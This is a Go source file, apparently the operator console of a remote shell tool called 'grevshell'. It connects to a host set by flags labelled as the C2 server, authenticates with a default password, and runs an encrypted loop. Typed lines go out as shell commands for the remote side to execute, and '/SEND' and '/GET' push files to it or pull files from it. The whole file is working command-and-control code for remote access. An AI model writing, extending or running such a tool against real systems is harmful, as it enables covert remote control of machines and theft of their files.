package main 

import (
	"log/slog"
	"fmt"
	"bufio"
	"os"
	"path/filepath"
	"strings"
	"flag"
	"net"

	"grevshell/grevcore"
)

var (
	C2Host		string
	C2Port		string
	C2Password	string
)

func main() {
	flag.StringVar(&C2Host, "h", "localhost", "Specify the host's address.")
	flag.StringVar(&C2Port, "p", "9999", "Specify the host's port.")
	flag.StringVar(&C2Password, "k", "password123", "Specify the authentication password.")
	
	flag.Parse()

	stream, err := net.Dial("tcp", net.JoinHostPort(C2Host, C2Port))

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	slog.Info(fmt.Sprintf("Connecting to %s.", stream.RemoteAddr()))
	key, err := grevcore.ExchangeKey(stream, C2Password)

	if err != nil {
		slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
		return
	}

	ProcessLoop(stream, key)
}


func ProcessLoop(c net.Conn, key []byte) {
	send := bufio.NewReader(os.Stdin)
	defer c.Close()

	for {
		fmt.Printf("%s - $ ", c.RemoteAddr())
		var packet grevcore.Packet
		line, err := send.ReadString('\n')

		if err != nil {
			slog.Error("An error occured while reading the command.", slog.Any("ERROR", err))
			continue
		}

		fields := strings.Fields(line)


		if len(fields) < 1 {
			continue
		}

		switch fields[0] {
		case "/SEND":
			if len(fields) < 2 {
				fmt.Printf("Missing argument.\n")
				continue
			}

			packet.Header = grevcore.FileReceiveHeader

			filename := fields[1]
			data, err := os.ReadFile(filename)

			if err != nil {
				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				continue
			}

			packet.FileName = filename
			packet.Data = data 

		case "/GET":
			if len(fields) < 2 {
				fmt.Printf("Missing argument.\n")
				continue
			}
			packet.Header = grevcore.FileSendHeader
			filename := fields[1]

			packet.FileName = filename

		case "/EXIT":
			return

		default:
			packet.Header = grevcore.ShellExecHeader
			packet.Data = []byte(line)
		}

		err = grevcore.SendPacket(c, packet, key)

		if err != nil {
			slog.Error("An error occured while sending the request.", slog.Any("ERROR", err))
			continue
		}

		recv, err := grevcore.ReceivePacket(c, key)

		if err != nil {
			slog.Error("An error occured while receiving the response.", slog.Any("ERROR", err))
			continue
		}

		if recv.Data == nil {
			continue
		}

		switch recv.Header {
		case grevcore.FileReceiveHeader:
			slog.Info("Writing file.", "FILE", filepath.Base(recv.FileName))
			err := os.WriteFile(filepath.Base(recv.FileName), recv.Data, 0600)

			if err != nil {
				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
				return
			}

		default:
			fmt.Printf("%s\n", recv.Data)
		}

	}
}
